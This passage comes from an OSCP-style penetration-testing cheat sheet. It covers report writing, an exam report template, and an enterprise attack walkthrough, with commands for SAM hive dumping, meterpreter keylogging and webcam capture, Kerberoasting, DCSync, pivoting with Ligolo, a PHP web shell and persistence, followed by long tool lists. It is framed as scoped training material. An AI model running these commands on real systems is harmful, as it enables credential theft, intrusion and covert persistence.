reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

load mimikatz
msv
```

#### Dualhomed

```
ipconfig /all
route print
```

#### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

#### Interesting files

```
keysscan_start
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

      Stapler _ VulnHub

## 27. Documentation & Reporting

> Condensed from HTB Academy **Documentation & Reporting** (module 162).

### Notetaking and Organization

- Keep one directory per engagement; separate admin, deliverables, evidence, notes, scans, and OSINT.
- Log every command and its output; timestamp screenshots.
- Use a consistent note template per host and per finding.

```bash
mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,AD},Notes,OSINT,Wireless,Logging,Misc},Retest}
tree ACME-IPT/
```

Use tmux logging or `script` to capture terminal sessions:

```bash
# tmux logging (prefix + Shift+P with tmux-logging), or:
script -a session.log
```

### Report Types

- **Executive summary** — scope, objectives, high-level risk, business impact.
- **Technical report** — methodology, findings, evidence, remediation.
- **Full report** — executive + technical + appendices.
- **Retest report** — original findings, remediation status, residual risk.

### Components of a Finding

1. **Title** — concise and specific.
2. **Severity** — CVSS vector/score plus business context.
3. **Affected assets** — host, URL, parameter, account.
4. **Description** — root cause and conditions.
5. **Impact** — what an attacker can achieve.
6. **Evidence** — reproducible steps, requests/responses, screenshots, timestamps.
7. **Remediation** — specific, actionable, and prioritized.
8. **References** — CVE/CWE/OWASP/vendor guidance.

### Writing Tips

- Write for the audience: executives need impact, engineers need reproduction steps.
- Include exact commands and payloads with sensitive values redacted.
- Explain *why* a finding matters, not just the scanner output.
- Separate confirmed findings from informational observations.
- Use consistent naming and numbering across the report.
- Review for false positives, typos, and accidental credential exposure.
- Store evidence according to the engagement's data-retention rules.

### Report Quality Checklist

- [ ] Scope and dates match the contract.
- [ ] Every finding has evidence and remediation.
- [ ] CVSS scores and vectors are consistent.
- [ ] Screenshots are readable and redacted.
- [ ] No credentials, cookies, hashes, or client secrets in the report.
- [ ] Executive summary is accurate and free of jargon.
- [ ] Retest guidance and contact details are included.

### Reporting Resources

| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
| SysReptor | https://github.com/Syslifters/sysreptor |
| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |

### OSCP Exam Report Template

#### Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

#### Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

#### Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable
- Any additional items that were not included

#### High-Level Summary

I was tasked with performing an internal penetration test towards Offensive Security Exam.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal exam systems - the THINC.local domain.
My overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, I had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- 192.168.xx.xx (hostname) - Name of initial exploit
- 192.168.xx.xx (hostname) - BOF

#### Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

#### Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

#### Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

- 192.168.

#### Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, I was able to successfully gain access to **X** out of the **X** systems.

#### System IP: 192.168.x.x

#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.x.x       | **TCP**: 1433,3389\
**UDP**: 1434,161

**Nmap Scan Results:**

*Initial Shell Vulnerability Exploited*

*Additional info about where the initial shell was acquired from*

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Proof of Concept Code Here:**

**Local.txt Proof Screenshot**

**Local.txt Contents**

#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Exploit Code:**

**Proof Screenshot Here:**

**Proof.txt Contents:**

**System IP: 192.168.x.x**

**Service Enumeration**

**Privilege Escalation**

**System IP: 192.168.x.x**

**Service Enumeration**

**Privilege Escalation**

**System IP: 192.168.x.x**

**Service Enumeration**

**Privilege Escalation**

**System IP: 192.168.x.x**

**Vulnerability Exploited: bof**

Fill out this section with BOF NOTES.

**Proof Screenshot:**

**Completed Buffer Overflow Code:**

Please see Appendix 1 for the complete Windows Buffer Overflow code.

#### Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

#### House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

#### Additional Items

#### Appendix - Proof and Local Contents

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here

#### Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

#### Appendix - Completed Buffer Overflow Code

```
code here
```

## 28. Attacking Enterprise Networks

> Condensed from HTB Academy **Attacking Enterprise Networks** (module 163). This is an end-to-end engagement walkthrough; commands are generic and credentials are redacted.

### Engagement Flow

```text
Pre-Engagement
  -> External Information Gathering
  -> Service/Web Enumeration
  -> Initial Access
  -> Internal Information Gathering
  -> Exploitation & Privilege Escalation
  -> Lateral Movement
  -> AD Compromise
  -> Post-Exploitation
  -> Closeout
```

### External Information Gathering

```bash
# Scope-driven port scanning
sudo nmap --open -oA external_tcp_1k -iL scope
sudo nmap --open -p- -A -oA external_tcp_all -iL scope

# DNS zone transfer
dig axfr <DOMAIN> @<NAMESERVER>

# Virtual-host discovery
curl -s -I http://<TARGET> -H "Host: <VHOST>.<DOMAIN>" | grep "Content-Length:"
ffuf -w namelist.txt:FUZZ -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>

# Add discovered hosts
sudo tee -a /etc/hosts > /dev/null <<'EOF'
<TARGET_IP>  <VHOST>.<DOMAIN>
EOF
```

### Service and Web Enumeration

```bash
ftp <TARGET>
nc -nv <TARGET> 22
ssh <USER>@<TARGET>
nmap -sV -sC -p25 <TARGET>
telnet <TARGET> 25
telnet <TARGET> 110
nmap -p25 -Pn --script smtp-open-relay <TARGET>
rpcinfo <TARGET>

# Web
eyewitness -f <SUBDOMAINS> -d eyewitness_out
whatweb http://<TARGET>
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
wpscan -e ap -t 500 --url http://<TARGET>
wpscan -e u -t 500 --url http://<TARGET>
```

### Initial Access

- Exploit the exposed service or web application.
- Upload a web shell or use a public exploit/PoC.
- Establish a stable reverse shell and upgrade the TTY.
- Document the exact request/payload used.

```bash
# Example web shell call
curl 'http://<TARGET>/uploads/shell.php?cmd=id'

# Listener
nc -lvnp <PORT>
```

### Internal Information Gathering

```bash
# Dynamic SOCKS pivot over SSH
ssh -D 8081 -i <KEY> <USER>@<PIVOT>
grep socks4 /etc/proxychains.conf
proxychains nmap -sT -p 21,22,80,8080 <INTERNAL_IP>

# Living-off-the-land discovery
for i in $(seq 254); do ping -c1 -W1 172.16.8.$i & done | grep from
proxychains enum4linux -U -P <INTERNAL_IP>
proxychains showmount -e <INTERNAL_IP>

# Mount an NFS share
mkdir <MOUNT>
mount -t nfs <INTERNAL_IP>:/<SHARE> /tmp/<MOUNT>
```

### Internal Exploitation & Privilege Escalation

After pivoting, enumerate each reachable host and exploit the exposed services.

```bash
# Host discovery and service scans through the pivot
proxychains nmap -sT -Pn -p 21,22,80,139,445,3389,5985 <INTERNAL_SUBNET>
proxychains enum4linux -U -P <INTERNAL_IP>
proxychains showmount -e <INTERNAL_IP>

# SMB / WinRM
proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASSWORD>' --shares
proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASSWORD>'
```

Linux local privilege escalation:

```bash
id
sudo -l
uname -a
./linpeas.sh
find / -perm -4000 -type f 2>/dev/null
```

Windows local privilege escalation:

```cmd
whoami /priv
whoami /groups
systeminfo
.\winPEAS.exe
```

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Credential access after escalation:

```bash
secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<INTERNAL_IP>
```

```cmd
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
```

Document each host, the access obtained, and the privilege level. Escalate one host at a time, track the chain, and avoid unnecessary changes.

### Lateral Movement and AD Compromise

```bash
# SMB/winrm through the pivot
proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASSWORD>' --shares
proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASSWORD>'

# AD enumeration and Kerberoasting
Get-DomainUser * -SPN | select samaccountname
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spns.csv -NoTypeInformation
hashcat -m 13100 spns.csv /usr/share/wordlists/rockyou.txt

# ACL abuse and DCSync
Add-DomainGroupMember -Identity "<GROUP>" -Members "<USER>" -Credential $Cred -Verbose
proxychains secretsdump.py <USER>@<DC> -just-dc-ntlm
```

Use `proxychains` for every internal tool, keep a per-host log, and avoid changing the environment unless required by the scope.

### Persistence & Post-Exploitation

Only establish persistence when it is explicitly in scope. Common Windows/Linux mechanisms:

```cmd
:: Scheduled task
schtasks /create /tn <NAME> /tr "<COMMAND>" /sc onlogon /ru SYSTEM

:: Service
sc create <SERVICE> binPath= "<COMMAND>" start= auto
sc start <SERVICE>

:: User startup key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /d "<COMMAND>"
```

```bash
# Linux SSH key persistence
echo '<PUBLIC_KEY>' >> ~/.ssh/authorized_keys

# Web shell persistence
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/<FILE>.php
```

Document every change, prefer the least invasive mechanism, and remove all persistence during cleanup:

```cmd
schtasks /delete /tn <NAME> /f
sc delete <SERVICE>
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /f
```

```bash
rm -f /var/www/html/<FILE>.php
sed -i '/<PUBLIC_KEY>/d' ~/.ssh/authorized_keys
```

For post-exploitation, collect only the evidence needed to prove impact, avoid unnecessary data exfiltration, and record timestamps and hashes for the report.

### Post-Exploitation and Closeout

- Collect only the evidence needed to prove impact.
- Clean up uploaded shells, accounts, scheduled tasks, and service changes.
- Remove temporary files and restore modified configuration.
- Write the report with the attack chain, evidence, and remediation.
- Hold a closeout/review meeting and define retest scope.

### Engagement Checklist

- [ ] Scope, RoE, and emergency contacts confirmed.
- [ ] External attack surface mapped and evidenced.
- [ ] Initial access documented with reproducible steps.
- [ ] Internal pivot and enumeration logged.
- [ ] Privilege escalation and lateral movement proven.
- [ ] AD compromise (if in scope) documented.
- [ ] Cleanup completed and verified.
- [ ] Report reviewed and delivered.

## 29. Useful Resources

[HackTricks](https://book.hacktricks.xyz/)

[WADComs](https://wadcoms.github.io/#+SMB+Windows)

[GTFOBins](https://gtfobins.github.io/)

[SwisskyRepo - Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Living off the Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)

[Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)

### Kerberos

```shell
sudo apt-get install krb5-kdc
```

#### Ticket Handling

```shell
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache
export KRB5CCNAME='realpath <FILE>.ccache'
KRB5CCNAME=<FILE>.ccache <APPLICATION>
```

#### Kerberos related Files

```shell
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

#### Ticket Conversion

#### kribi to ccache

```shell
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`
```

#### ccache to kirbi

```shell
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
```

### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

#### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

#### Prepare Tunnel Interface

```shell
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```shell
sudo ip link set ligolo up
```

#### Setup Proxy on Attacker Machine

```shell
./proxy -laddr <LHOST>:443 -selfcert
```

#### Setup Agent on Target Machine

```shell
./agent -connect <LHOST>:443 -ignore-cert
```

#### Configure Session

```shell
ligolo-ng » session
```

```shell
[Agent : user@target] » ifconfig
```

```shell
sudo ip r add 172.16.1.0/24 dev ligolo
```

```shell
sudo ip route add 240.0.0.1/32 dev ligolo
```

```shell
[Agent : user@target] » start
```

#### Port Forwarding

```shell
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

#### Alternative Session Configuration

**Setup Proxy on Attacker Machine**

```shell
sudo ./proxy -selfcert
```

**Prepare Tunnel Interface**

```shell
ligolo-ng » ifcreate --name ligolo
```

#### Add Route to Tunnel Interface

```shell
ligolo-ng » route_add --name ligolo --route <SUBNET>
```

**Setup Agent on Target Machine**

```cmd
Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
```

### Microsoft Windows

#### dir

```cmd
dir /a
dir /a:d
dir /a:h
dir flag* /s /p
dir /s /b *.log
```

### Time and Date

#### Get the Server Time

```shell
sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

#### Stop virtualbox-guest-utils to stop syncing Time

```shell
sudo /etc/init.d/virtualbox-guest-utils stop
```

#### Stop systemd-timesyncd to sync Time manually

```shell
sudo systemctl stop systemd-timesyncd
```

#### Disable automatic Sync

```shell
sudo systemctl disable --now chronyd
```

#### Options to set the Date and Time

#### net time

```shell
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
```

#### ntpdate

```shell
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
```

#### rdate

```shell
sudo rdate -n <RHOST>
sudo rdate -s <RHOST>
```

#### faketime

```shell
faketime "$(ntpdate -q <DOMAIN> | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" <COMMAND>
faketime "$(ntpdate -q <DOMAIN> | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" <COMMAND> -timeout 60
```

#### timedatectl

```shell
sudo timedatectl show
sudo timedatectl set-ntp false
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

#### Keep in Sync with a Server

```shell
while [ 1 ]; do sudo ntpdate <RHOST>;done
```

### Upgrading Shells

```shell
python -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
export XTERM=xterm
```

```shell
Ctrl + z
stty -a
stty raw -echo;fg
stty rows 37 cols 123    // stty rows 50 columns 400
export TERM=xterm-256color
bash
```

Alternatively:

```shell
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

#### Oneliner

```shell
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Error Handling

#### Fixing Staircase Effect

```shell
env reset
```

```shell
stty onlcr
```

### uv

```shell
uv add --script <SCRIPT> -r requirements.txt
uv run --script <SCRIPT>
```

### VirtualBox

```shell
sudo pkill VBoxClient && VBoxClient --clipboard
```

### virtualenv

```shell
sudo apt-get install virtualenv
python3 -m virtualenv venv
. venv/bin/activate
```

```shell
virtualenv -p python2.7 venv
```

```cmd
python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
```

### OSCP Learning Resources

| Name | URL |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering Resources

| Nmap | https://github.com/nmap/nmap |

### Web Application Analysis Resources

| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| JWTLens | https://jwtlens.netlify.app |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPProbe | https://github.com/Chocapikk/wpprobe |
| WPScan | https://github.com/wpscanteam/wpscan |

### Database Assessment Resources

| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

### Password Attack Resources

| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John the Ripper | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| ntlm.pw | https://ntlm.pw |
| pypykatz | https://github.com/skelsec/pypykatz |

### Exploitation Tool Resources

| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |

### Post-Exploitation Resources

| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | https://github.com/ajm4n/adPEAS |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/SpecterOps/BloodHound |
| BloodHound-Legacy | https://github.com/SpecterOps/BloodHound-Legacy |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound-Legacy Collectors | https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors |
| BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
| bloodhound-quickwin | https://github.com/kaluche/bloodhound-quickwin |
| bloodyAD | https://github.com/CravateRouge/bloodyAD |
| Cable | https://github.com/logangoins/Cable |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| certipy-merged | https://github.com/zimedev/certipy-merged |
| Cheat Sheet - Attack Active Directory | https://github.com/drak3hft7/Cheat-Sheet---Active-Directory |
| DonPAPI | https://github.com/login-securite/DonPAPI |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| gopacket | https://github.com/mandiant/gopacket |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | https://github.com/rebootuser/LinEnum |
| lsassy | https://github.com/Hackndo/lsassy |
| Moriaty | https://github.com/BC-SECURITY/Moriarty |
| nanodump | https://github.com/fortra/nanodump |
| NetExec | https://github.com/Pennyw0rth/NetExec |
| Outpacket | https://github.com/n00py/Outpacket |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| Penelope | https://github.com/brightio/penelope |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| pyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpADWS | https://github.com/wh0amitz/SharpADWS |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpChromium | https://github.com/djhohnstein/SharpChromium |
| SharpHound | https://github.com/SpecterOps/SharpHound |
| SharpSuccessor | https://github.com/logangoins/SharpSuccessor |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| Titanis | https://github.com/trustedsec/Titanis |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |

### Social Media Resources

| OSCP Guide 01/12 – My Exam Experience | https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
| HackTricks | https://book.hacktricks.xyz/ |
| HackTricks Local Windows Privilege Escalation Checklist | https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rednode Windows Privilege Escalation | https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/ |
| OSCP Cheat Sheet by xsudoxx | https://github.com/xsudoxx/OSCP |
| OSCP-Tricks-2023 by Rodolfo Marianocy | https://github.com/rodolfomarianocy/OSCP-Tricks-2023 |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/ |

### Enumeration AIO

[Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)
